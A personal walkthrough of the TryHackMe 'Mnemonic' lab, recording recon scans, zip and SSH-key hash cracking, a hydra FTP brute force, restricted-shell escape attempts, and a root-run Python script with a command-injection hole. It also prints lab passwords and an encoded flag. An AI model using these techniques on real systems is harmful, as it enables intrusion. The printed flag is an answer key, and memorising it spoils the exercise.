@@ -1,0 +1,619 @@
+Name: Mnemonic 
+Date: 20/03/2022
+Difficulty: Medium
+Description: I hope you have fun.
+Better Description: OSINT https://tryhackme.com/p/villwocki, IDS bypassing andpython source code 
+Goals: improve my source-code analysis to hack the box. 
+Learnt: 
+ Look for zip files in backups directories, 
+ zip2john->john the hashes remember to change the wordlist, 
+ wget -r ftp://[username]:[password]@[ip]/ # is wow never knew you could do that
+ IDS/IPS bypassing rbash
+ read nvm read...
+
+
+root@ip-10-10-8-137:~# nmap -sC -sV -O -T 4 -p- 10.10.16.146  
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-27 20:29 GMT
+Stats: 0:02:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 33.32% done; ETC: 20:36 (0:04:14 remaining)
+Stats: 0:22:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 0.00% done
+Nmap scan report for ip-10-10-16-146.eu-west-1.compute.internal (10.10.16.146)
+Host is up (0.00051s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/webmasters/*
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
+|   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
+|_  256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (EdDSA)
+MAC Address: 02:C3:6E:50:55:8F (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=1/27%OT=21%CT=1%CU=44646%PV=Y%DS=1%DC=D%G=Y%M=02C36E%T
+OS:M=61F305E0%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A
+OS:)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5
+OS:=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W
+OS:6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S
+OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R
+OS:D=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=
+OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U
+OS:1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF
+OS:I=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1325.41 seconds
+
+
+https://github.com/7RU7H/AllTheHackingScripts/blob/main/bash/nmapScriptGun.sh
+
+
+
+
+root@ip-10-10-159-202:~# nikto -h 10.10.224.120
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.224.120
++ Target Hostname:    ip-10-10-224-120.eu-west-1.compute.internal
++ Target Port:        80
+ftp 10.10.+ Start Time:         2022-03-18 12:42:12 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0xf 0x5ab21beabb5e0 
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ File/dir '/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 2 entries which should be manually viewed.
++ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2022-03-18 12:42:21 (GMT0) (9 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+root@ip-10-10-159-202:~# dirb http://10.10.224.120
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Mar 18 12:42:21 2022
+URL_BASE: http://10.10.224.120/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.224.120/ ----
++ http://10.10.224.120/index.html (CODE:200|SIZE:15)                           
++ http://10.10.224.120/robots.txt (CODE:200|SIZE:48)                           
++ http://10.10.224.120/server-status (CODE:403|SIZE:278)                       
+==> DIRECTORY: http://10.10.224.120/webmasters/                                
+                                                                               
+---- Entering directory: http://10.10.224.120/webmasters/ ----
+==> DIRECTORY: http://10.10.224.120/webmasters/admin/                          
+==> DIRECTORY: http://10.10.224.120/webmasters/backups/                        
++ http://10.10.224.120/webmasters/index.html (CODE:200|SIZE:0)                 
+                                                                               
+---- Entering directory: http://10.10.224.120/webmasters/admin/ ----
++ http://10.10.224.120/webmasters/admin/index.html (CODE:200|SIZE:0)           
+                                                                               
+---- Entering directory: http://10.10.224.120/webmasters/backups/ ----
++ http://10.10.224.120/webmasters/backups/index.html (CODE:200|SIZE:0)         
+                                                                               
+-----------------
+END_TIME: Fri Mar 18 12:42:31 2022
+DOWNLOADED: 18448 - FOUND: 6
+
+
+Check for zips from: https://therennox.github.io/thm/mnemonic
+
+root@ip-10-10-159-202:~# gobuster dir -u http://10.10.224.120/webmasters/backups -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .zip
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.224.120/webmasters/backups
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     zip
+[+] Timeout:        10s
+===============================================================
+2022/03/18 13:02:23 Starting gobuster
+===============================================================
+/backups.zip (Status: 200)
+Progress: 23866 / 220561 (10.82%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2022/03/18 13:03:38 Finished
+===============================================================
+
+
+https://dfir.science/2014/07/how-to-cracking-zip-and-rar-protected.html
+
+oot@ip-10-10-159-202:~# zip2john backups.zip > bup.hashes
+ver 1.0 backups.zip/backups/ is not encrypted, or stored with non-handled compression type
+ver 2.0 efh 5455 efh 7875 backups.zip/backups/note.txt PKZIP Encr: 2b chk, TS_chk, cmplen=67, decmplen=60, crc=AEE718A8 type=8
+
+root@ip-10-10-159-202:~# cat bup.hashes 
+backups.zip/backups/note.txt:$pkzip2$1*2*2*0*43*3c*aee718a8*42*4a*8*43*aee7*24e2*2918f93964f9ffa39d4a5fc0d589cae4222fd228a12bc6459bf7b383bdc3cd74557af7a16783ba3217388d2db639162dcee0456f5264bb1839b0f63a28de19581bda79*$/pkzip2$:backups/note.txt:backups.zip::backups.zip
+
+john buphashes --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                                                                                          1 ⨯
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+00385007         (backups.zip/backups/note.txt)     
+1g 0:00:00:01 DONE (2022-03-18 13:35) 0.9009g/s 12871Kp/s 12871Kc/s 12871KC/s 01/17/96..-sxc-danca-
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+@vill
+
+James new ftp username: ftpuser
+we have to work hard
+
+root@ip-10-10-159-202:~hydra -l ftpuser -P/usr/share/wordlists/rockyou.txt 10.10.224.120 ftp
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-03-18 13:40:25
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ftp://10.10.224.120:21/
+[STATUS] 272.00 tries/min, 272 tries in 00:01h, 14344126 to do in 878:56h, 16 active
+[STATUS] 267.67 tries/min, 803 tries in 00:03h, 14343595 to do in 893:08h, 16 active
+[21][ftp] host: 10.10.224.120   login: ftpuser   password: love4ever
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2022-03-18 13:44:28
+
+root@ip-10-10-159-202:~# ftp 10.10.224.120
+Connected to 10.10.224.120.
+220 (vsFTPd 3.0.3)
+Name (10.10.224.120:root): ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ascii
+200 Switching to ASCII mode.
+ftp> passive
+Passive mode on.
+ftp> ls
+227 Entering Passive Mode (10,10,224,120,39,20).
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
+drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
+226 Directory send OK.
+ftp> ls -la
+227 Entering Passive Mode (10,10,224,120,39,21).
+150 Here comes the directory listing.
+drwx------   12 1003     1003         4096 Jul 14  2020 .
+drwx------   12 1003     1003         4096 Jul 14  2020 ..
+lrwxrwxrwx    1 1003     1003            9 Jul 14  2020 .bash_history -> /dev/null
+-rw-r--r--    1 1003     1003          220 Jul 13  2020 .bash_logout
+-rw-r--r--    1 1003     1003         3771 Jul 13  2020 .bashrc
+-rw-r--r--    1 1003     1003          807 Jul 13  2020 .profile
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
+drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
+226 Directory send OK.
+ftp> get .bash_history
+local: .bash_history remote: .bash_history
+227 Entering Passive Mode (10,10,224,120,39,88).
+550 Failed to open file.
+ftp> get data-1
+local: data-1 remote: data-1
+227 Entering Passive Mode (10,10,224,120,39,18).
+550 Failed to open file.
+ftp> cd ..
+250 Directory successfully changed.
+ftp> ls
+227 Entering Passive Mode (10,10,224,120,39,94).
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
+drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
+226 Directory send OK.
+ftp> cd ..
+250 Directory successfully changed.
+ftp> ls
+227 Entering Passive Mode (10,10,224,120,39,43).
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
+drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
+226 Directory send OK.
+ftp> pwd
+257 "/" is the current directory
+ftp> get data-1
+local: data-1 remote: data-1
+227 Entering Passive Mode (10,10,224,120,39,90).
+550 Failed to open file.
+
+# From rennox, just wow
+wget -r ftp://[username]:[password]@[ip]/
+
+root@ip-10-10-165-220:~/10.10.62.13# pwd
+/root/10.10.62.13
+root@ip-10-10-165-220:~/10.10.62.13# grep -r -e password
+data-4/not.txt:james change ftp user password
+
+wasted 60 minutes hydra bruteforcing, but I made a autolooterFTP.sh and added loads of stuff to my recon script
+Another save from rennox
+find . -type f
+
+root@ip-10-10-165-220:~/10.10.62.13# find . -type f
+./.bash_logout
+./data-4/id_rsa
+./data-4/not.txt
+./.profile
+./.bashrc
+
+/opt/john/ssh2john.py id_rsa > rsaHASH
+root@ip-10-10-165-220:~# john rsaHASH --wordlist=/usr/share/wordlists/rockyou.txt 
+Note: This format may emit false positives, so it will keep trying even after finding a
+possible candidate.
+Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
+Use the "--format=ssh-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bluelove         (id_rsa)
+
+
+root@ip-10-10-165-220:~# chmod 600 id_rsa
+root@ip-10-10-165-220:~# ssh -i id_rsa james@10.10.62.13 -p 1337
+
+
+Broadcast message from root@mnemonic (somewhere) (Sat Mar 19 20:50:55 2022):   
+                                                                               
+     IPS/IDS SYSTEM ON !!!!                                                    
+ **     *     ****  **                                                         
+         * **      *  * *                                                      
+*   ****                 **                                                    
+ *                                                                             
+    * *            *                                                           
+       *                  *                                                    
+         *               *                                                     
+        *   *       **                                                         
+* *        *            *                                                      
+              ****    *                                                        
+     *        ****                                                             
+                                                                               
+ Unauthorized access was detected.  
+
+james@mnemonic:~$ cat 6450.txt
+5140656
+354528
+842004
+1617534
+465318
+1617534
+509634
+1152216
+753372
+265896
+265896
+15355494
+24617538
+3567438
+15355494
+james@mnemonic:~$ cat noteforjames.txt
+noteforjames.txt
+
+@vill
+
+james i found a new encryption \u0130mage based name is Mnemonic  
+
+I created the condor password. don't forget the beers on saturday
+
+Soon after I was kicked off.
+Firstly I have never done any room where with any IDS/IPS and with my goal being to bypass the stegnography parts to get to source code reading parts, I decided read some more writeups and research how to bypass the IDS/IPS.
+
+https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
+
+From the above article:
+ssh -i id_rsa james@10.10.86.254 -p 1337 -t "/bin/bash" # failed # rbash: /bin/bash: restricted: cannot specify `/' in command names
+james@mnemonic:~$ python -c 'import os;os.system("/bin/sh")'# failed # -rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
+james@mnemonic:~$ vim !/bin/sh # failed # -rbash: !/bin/sh: event not found
+ssh -i id_rsa james@10.10.86.254 -p 1337 -t "bash --no-profile" # failed # bash: --no-profile: invalid option
+php -a then exec("sh -i"); # failed # -rbash: syntax error near unexpected token `('
+
+After trying these I went to rennox's writeup:
+Apparently the stegnography part of this ctf is to advertise a tool created by the the room creator
+Goal of this room is bang my head against some source-code analysis, rather than stegonagraphy and osint, so the codes I got listed above.
+git clone https://github.com/MustafaTanguner/Mnemonic.git
+
+Then I read https://m3n0sd0n4ld.github.io/thm/Mnemonic/
+To figure out how to get the tool to decrypt the message and realised I had fat fingered the '-' betwen no and profile:
+ ssh -i id_rsa james@10.10.86.254 -p 1337 -t "bash --noprofile"
+
+james@mnemonic:/home$ ls -la condor/
+ls: cannot access 'condor/..': Permission denied
+ls: cannot access 'condor/'\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\''': Permission denied
+ls: cannot access 'condor/.gnupg': Permission denied
+ls: cannot access 'condor/.bash_logout': Permission denied
+ls: cannot access 'condor/.bashrc': Permission denied
+ls: cannot access 'condor/.profile': Permission denied
+ls: cannot access 'condor/.cache': Permission denied
+ls: cannot access 'condor/.bash_history': Permission denied
+ls: cannot access 'condor/.': Permission denied
+ls: cannot access 'condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==': Permission denied
+total 0
+d????????? ? ? ? ?            ?  .
+d????????? ? ? ? ?            ?  ..
+d????????? ? ? ? ?            ? 'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw=='
+l????????? ? ? ? ?            ?  .bash_history
+-????????? ? ? ? ?            ?  .bash_logout
+-????????? ? ? ? ?            ?  .bashrc
+d????????? ? ? ? ?            ?  .cache
+d????????? ? ? ? ?            ?  .gnupg
+-????????? ? ? ? ?            ?  .profile
+d????????? ? ? ? ?            ? ''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\'''
+
+
+echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d
+https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg
+
+echo "VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==" | base64 -d # is the user.txt
+
+The first leads to a picture of Kevin Mitnick: https://en.wikipedia.org/wiki/Kevin_Mitnick
+Also known a Condor.
+
+Access Code image file Path:/root/Downloads/maxresdefault.jpg
+(1) ENCRYPT (2) DECRYPT
+
+>>>>2
+Please enter the file Path:/root/codes.txt
+
+pasificbell1981
+
+root@ip-10-10-63-80:~# ssh condor@10.10.86.254 -p 1337
+
+Now for the part I am here for.
+
+condor@mnemonic:/home$ uname -a
+Linux mnemonic 4.15.0-111-generic #112-Ubuntu SMP Thu Jul 9 20:32:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+condor@mnemonic:/$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+@reboot root /usr/bin/sudo /usr/bin/python3 /bin/IPS.py
+@reboot root /usr/bin/sudo /sbin/dhclient enp0s3
+
+
+condor@mnemonic:/$ sudo -l
+[sudo] password for condor: 
+Matching Defaults entries for condor on mnemonic:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User condor may run the following commands on mnemonic:
+    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
+
+
+condor@mnemonic:/$ cat /bin/examplecode.py 
+#!/usr/bin/python3
+import os
+import time
+import sys
+def text(): #text print 
+
+
+        print("""
+
+        ------------information systems script beta--------
+        ---------------------------------------------------
+        ---------------------------------------------------
+        ---------------------------------------------------
+        ---------------------------------------------------
+        ---------------------------------------------------
+        ---------------------------------------------------
+        ----------------@author villwocki------------------""")
+        time.sleep(2)
+        print("\nRunning...")
+        time.sleep(2)
+        os.system(command="clear")
+        main()
+
+
+def main():
+        info()
+        while True:
+                select = int(input("\nSelect:"))
+
+                if select == 1:
+                        time.sleep(1)
+                        print("\nRunning")
+                        time.sleep(1)
+                        x = os.system(command="ip a")
+                        print("Main Menü press '0' ")
+                        print(x)
+
+                if select == 2:
+                        time.sleep(1)
+                        print("\nRunning")
+                        time.sleep(1)
+                        x = os.system(command="ifconfig")
+                        print(x)
+
+                if select == 3:
+                        time.sleep(1)
+                        print("\nRunning")
+                        time.sleep(1)
+                        x = os.system(command="ip route show")
+                        print(x)
+
+                if select == 4:
+                        time.sleep(1)
+                        print("\nRunning")
+                        time.sleep(1)
+                        x = os.system(command="cat /etc/os-release")
+                        print(x)
+
+                if select == 0: 
+                        time.sleep(1)
+                        ex = str(input("are you sure you want to quit ? yes : "))
+
+                        if ex == ".":
+                                print(os.system(input("\nRunning....")))
+                        if ex == "yes " or "y":
+                                sys.exit()
+                      
+
+                if select == 5:                     #root
+                        time.sleep(1)
+                        print("\nRunning")
+                        time.sleep(2)
+                        print(".......")
+                        time.sleep(2)
+                        print("System rebooting....")
+                        time.sleep(2)
+                        x = os.system(command="shutdown now")
+                        print(x)
+
+                if select == 6:
+                        time.sleep(1)
+                        print("\nRunning")
+                        time.sleep(1)
+                        x = os.system(command="date")
+                        print(x)
+
+
+
+
+                if select == 7:
+                        time.sleep(1)
+                        print("\nRunning")
+                        time.sleep(1)
+                        x = os.system(command="rm -r /tmp/*")
+                        print(x)
+
+                      
+              
+
+
+       
+
+
+            
+
+def info():                         #info print function
+        print("""
+
+        #Network Connections   [1]
+
+        #Show \u0130fconfig         [2]
+
+        #Show ip route         [3]
+
+        #Show Os-release       [4]
+
+        #Root Shell Spawn      [5]           
+
+        #Print date            [6]
+
+        #Exit                  [0]
+
+        """)
+
+def run(): # run function 
+        text()
+
+run()
+
+condor@mnemonic:/$ ls -la /bin/examplecode.py
+-rw-r--r-- 1 root root 2352 Jul 15  2020 /bin/examplecode.py
+
+Running it a 
+
+Select:5
+
+Running
+.......
+System rebooting....
+Failed to set wall message, ignoring: Interactive authentication required.
+Failed to power off system via logind: Interactive authentication required.
+Failed to open /dev/initctl: Permission denied
+Failed to talk to init daemon.
+256
+
+
+We can still execute this script, it is owned by root so finding away to bypass authenication to edit it would lead root ownership of any changes.
+Tried:
+
+condor@mnemonic:/$ python3 -c 'import os;os.system("/bin/nano /bin/examplecode.py")' # It would not save
+condor@mnemonic:/$ sudo python3 -c 'import os;os.system("/bin/nano /bin/examplecode.py")'
+Sorry, user condor is not allowed to execute '/usr/bin/python3 -c import os;os.system("/bin/nano /bin/examplecode.py")' as root on mnemonic.
+
+condor@mnemonic:/$ python3 -c 'open("/bin/examplecode.py","w+").write(os.system("/bin/bash"))'
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+PermissionError: [Errno 13] Permission denied: '/bin/examplecode.py'
+
+
+Reading for the nuances in script, I tried ./bin/bash for option 0; I also did not run as root, sudo python3 ... ...*sigh*.
+This meant when I then 0 -> '.' I am still running the script as condor.
+
+echo -n congratulationsyoumadeithashme | md5sum
